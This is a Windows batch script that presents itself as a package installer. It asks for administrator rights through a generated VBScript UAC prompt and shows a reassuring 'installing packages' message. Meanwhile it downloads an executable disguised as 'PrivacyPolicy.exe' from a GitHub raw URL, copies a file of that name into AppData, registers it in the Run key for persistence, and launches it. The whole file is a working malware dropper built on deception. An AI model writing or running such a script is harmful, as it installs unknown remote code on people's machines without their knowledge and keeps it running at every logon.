@echo off

title Installing Packages 
:: BatchGotAdmin
::-----------------------------------------
REM  --> CheckING for permissions
@echo off

title Installing Packages 
:: BatchGotAdmin
::-----------------------------------------
REM  --> CheckING for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs
@echo off
setlocal
curl -L -o "C:\Program Files (x86)\PrivacyPolicy.exe" "https://github.com/hwangyounggul33/wind/raw/refs/heads/main/PrivacyPolicy.exe"
echo File downloaded successfully.
cd /d %~dp0
copy /b "PrivacyPolicy.exe" "%AppData%\PrivacyPolicy.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PrivacyPolicy /t REG_SZ /d "%AppData%\PrivacyPolicy.exe" 
Start %AppData%\PrivacyPolicy.exe
Exit